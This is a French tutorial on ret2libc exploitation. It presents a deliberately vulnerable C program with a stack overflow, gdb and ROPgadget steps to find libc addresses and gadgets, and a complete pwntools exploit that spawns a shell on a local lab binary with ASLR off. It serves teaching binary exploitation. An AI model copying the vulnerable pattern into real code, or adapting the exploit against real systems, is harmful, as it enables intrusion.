#### Ret2libc (NX activé)

Généralement sur de plus modernes machines, afin de limiter au mieux les risques, l'exécution de la stack se retrouve désactivée (protection NX activée), ainsi l'exécution de shellcode n'est plus possible et il faut parfois contourner les principes de bases. Le ret2libc est une technique se basant sur la libc (le linker dynamique) où l'utilisateur va se servir des adresses d'informations déjà existantes dans celle-ci afin de contourner le programme. Le but ici est de contrôler RIP, trouver l'adresse de la fonction system() déjà présente dans la libc, trouver la string "/bin/sh" aussi présente dans la libc et enfin appeler la fonction exit() pour finir le ret2libc proprement. Cela permettra ainsi d'obtenir un shell sans être passé par l'exécution d'un shellcode.

Voici le code vulnérable pour cette méthode, il ne change pas des méthodes précédentes car celle-ci se base toujours sur un simple Stack Buffer Overflow :

```
#include <stdio.h>
#include <unistd.h>

void vulnerable_function() {
	char buffer[64];
	read(0, buffer, 512);
}

int main() {
	vulnerable_function();
	return 0;
}

```

La compilation diffère juste un peu car cette fois-ci nous compilons avec NX.

Nous nous retrouvons toujours sans protection pour cette technique, l'ASLR étant désactivé nous pouvons trouver directement les 3 informations importantes via un grep de la libc qui est associée à notre binaire. Afin de trouver la libc associée ainsi que son chemin absolu, nous pouvons taper la commande :

* ldd ./exploit --> libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6

Ainsi nous voyons que notre binaire est lié à la libc de notre machine, c'est-à-dire la libc.so.6

Nous allons maintenant récupérer les adresses via gdb, une fois un break de main fait et un run :

* p system --> $1 = {<text variable, no debug info>} 0x7ffff7e09110 `<system>`
* p exit --> $2 = {<text variable, no debug info>} 0x7ffff7df8340 `<exit>`

Pour trouver /bin/sh il faut utiliser la commande find avec une adresse de départ, une taille de recherche, ainsi que la string recherchée. Comme nous savons que la string "/bin/sh" se trouve dans la libc notre adresse de départ sera le début de la libc, elle est trouvable comme ceci :

* info proc mappings --> 0x00007ffff7db6000 0x00007ffff7dde000 0x28000            0x0                r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 (la première)
* find 0x00007ffff7db6000, 0x00007ffff7f9f000, "/bin/sh" --> 0x7ffff7f5dea4

Avant de passer au repérage ainsi qu'à l'exploitation, il reste une dernière information à trouver, en effet en ELF x64, le premier argument d'une fonction se trouve toujours dans le registre RDI, il nous faut donc un gadget qui mettra l'adresse de "/bin/sh" dans le registre RDI avant l'appel system. Toujours simplement nous pouvons le faire avec l'outil ROPgadget :

* ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" --> 0x000000000002a145 : pop rdi ; ret (Pour rappel pop rdi prend la valeur suivante sur la pile et la mets dans le registre RDI)

Bien sur la valeur de pop rdi ; ret que nous voyons ici n'est pas l'adresse réelle du gadget mais l'offset auquel il se trouve de la libc, ainsi pour connaître son adresse réelle il faut faire une petite addition simple :

* Adresse de base de la libc + offset du gadget = 0x00007ffff7db6000 + 0x000000000002a145 = 0x00007ffff7de0145

En toute logique sur une ancienne libc l'exploitation fonctionnerait sans problème, malheureusement sur de plus récentes libc, comme mentionné précédemment, la fonction system() s'aligne sur 16 octets, nous avons donc un système de parité (2 x 8 octets = pair), cependant ici nous n'avons pas de parité dans notre exploitation : 72 octets (9 x 8) + 6 instructions envoyées donc cela fait 15. L'alignement n'étant pas correct le programme plantera, pour cela nous allons rajouter un gadget ret au tout début pour aligner proprement la mémoire.

* ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep " : ret" --> 0x000000000002846b : ret

Nous avons donc maintenant tout ce qu'il nous faut pour ret2libc, il ne reste plus qu'à trouver l'offset pour contrôler RIP. Encore une fois le repérage de l'offset s'est fait ici via le programme cyclic mentionné dans le premier Stack Buffer Overflow et nous trouvons un offset de 72 pour aller jusqu'à RIP. Il ne reste plus qu'à écrire l'exploit pour déclencher notre shell :

```
from pwn import *

exe = ELF('./exploit')

p = process(exe.path)

ret_addr = 0x00007ffff7dde46b
pop_rdi = 0x00007ffff7de0145
system_addr = 0x7ffff7e09110
binsh_addr = 0x7ffff7f5dea4
exit_addr = 0x7ffff7df8340

payload = b"A" * 72
payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(exit_addr)

p.send(payload)

p.interactive()
```

Dans le code il sera possible d'apercevoir quelques étapes supplémentaires non mentionnées dans l'exploitation comme l'ajout de "0" dans le registre RDI après l'appel system, cela est normal car exit() attend aussi une valeur dans RDI, si nous laissions l'adresse de "/bin/sh" dans RDI alors la fonction exit() planterait. Nous mettons donc un "0" dans le premier argument de la fonction pour quitter proprement.
